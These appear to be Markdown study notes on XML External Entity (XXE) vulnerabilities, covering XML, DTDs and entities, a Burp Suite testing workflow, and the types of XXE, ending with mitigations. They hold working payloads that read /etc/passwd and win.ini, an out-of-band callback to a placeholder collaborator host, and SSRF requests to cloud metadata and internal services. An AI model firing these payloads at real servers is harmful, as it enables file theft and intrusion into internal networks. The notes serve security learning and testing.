
##  XML (eXtensible Markup Language)

**Used to store and transport data**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<user>
    <name>John</name>
    <email>john@example.com</email>
    <role>admin</role>
</user>
```

## DTD (Document Type Definition)

> DTD defines the structure/rules of an XML document 
   It can define ENTITIES (variables) 
  
```xml
<?xml version="1.0"?>
<!DOCTYPE user [
    <!ELEMENT user (name, email)>
    <!ELEMENT name (#PCDATA)>
    <!ELEMENT email (#PCDATA)>
]>
<user>
    <name>John</name>
    <email>john@example.com</email>
</user>
```

## Entity

> Entity = A variable in XML 
   Think of it like a shortcut/placeholder 

**INTERNAL Entity (defined inside XML)** 
```xml
<!DOCTYPE foo [
    <!ENTITY myname "John Doe">
]>
<user>
    <name>&myname;</name>   <!-- Resolves to "John Doe" -->
</user>
```

**EXTERNAL Entity (reads from outside)**
==THIS IS WHERE XXE HAPPENS!==
```xml
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>   <!-- Reads /etc/passwd from server! -->
</user>
```

# XXE
**XXE** happens when an application parses/processes **XML input** in an unsafe way and allows an attacker to define **external entities**.

**“Attacker uses XML to make the server read internal files or access internal URLs.”**

**XXE happens when:**
- the server accepts XML input
- XML parser allows **DOCTYPE**
- external entity resolution is enabled

## Where XXE is commonly found
- SOAP APIs
- Old REST APIs that accept XML
- File upload features (`.xml`, `.svg`)
- SAML authentication responses
- Enterprise integrations

## Testing

- Burp Suite → Proxy → HTTP history

**Step 1:** Confirm XML Input Exists
- Does the request body contain XML tags?

Example:
```
```xml
<user>
  <name>xyz</name>
</user>
```

**Step 2:** Check if the Server Accepts DOCTYPE

Add a harmless DOCTYPE and entity:
```
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe "TEST">
]>
<root>&xxe;</root>

```
- If response shows TEST
- Or if server does NOT block DOCTYPE
**If DOCTYPE is allowed then you test for XXE**

**NOW:**
Test for File Read (In-band XXE)
Test Blind XXE 
Test SSRF via XXE (Optional)


## Types of XXE

| #   | XXE Type                 | Meaning                                         | Common Outcome                          |
| --- | ------------------------ | ----------------------------------------------- | --------------------------------------- |
| 1   | *Classic XXE (In-band)   | Output comes directly in response               | File read / SSRF result shown           |
| 2   | *Blind XXE               | No output shown, but server still makes request | SSRF, DNS/HTTP callbacks                |
| 3   | XXE via SSRF             | XXE used to hit internal URLs                   | Access internal services/cloud metadata |
| 4   | XXE for File Read        | XXE used to read local server files             | Config leak, credentials leak           |
| 5   | XXE DoS (Billion Laughs) | XML expands massively and crashes app           | Denial of Service                       |

## Classic XXE (In-Band / Direct)
The server parses/processes your XML, processes the external entity, and returns the result directly in the response.

**Example:**

File Reading (Linux):
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>
    <name>&xxe;</name>
    <email>test@test.com</email>
</user>
```

File Reading (Windows):
```
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<user>
    <name>&xxe;</name>
</user>
```


## Blind XXE (Out-of-Band)
The server processes the XML and fetches the entity, but does NOT return the result in the response. You need to exfiltrate data to your own server.

### Blind XXE via HTTP (Out-of-Band Detection)

Step 1: Check if XXE is possible (detection)

```
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://YOUR-BURP-COLLABORATOR.com">
]>
<user>
    <name>&xxe;</name>
</user>
```

If you receive a DNS/HTTP hit on Burp Collaborator → XXE is possible!



## XXE to SSRF (Server-Side Request Forgery)

Use XXE to make the server send requests to internal resources that are not accessible from outside.
**Attacker can force server to access internal URLs like:**
- `http://localhost:8080`
- `http://169.254.169.254/` (cloud metadata)
- internal admin panels
###  Accessing Internal Services
```
<!-- Access internal admin panel -->
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "http://127.0.0.1:8080/admin">
]>
<user><name>&xxe;</name></user>

<!-- Access internal API -->
<!ENTITY xxe SYSTEM "http://internal-api.company.local/api/users">

<!-- Access database management -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:5984/_all_dbs">  <!-- CouchDB -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:9200/_cat/indices"> <!-- Elasticsearch -->
<!ENTITY xxe SYSTEM "http://127.0.0.1:6379"> <!-- Redis -->
```


## Impact
- Sensitive file read (ex: /etc/passwd, configs, keys)
- SSRF (access internal services / cloud metadata)
- DoS (Billion Laughs XML expansion)
- Rare: RCE (depends on parser + app)

## Mitigations
1. Disable DTD processing in XML parser
2. Disable external entity loading
3. Use JSON instead of XML where possible
4. Use safe libraries (defusedxml for Python)
5. Validate XML input before parsing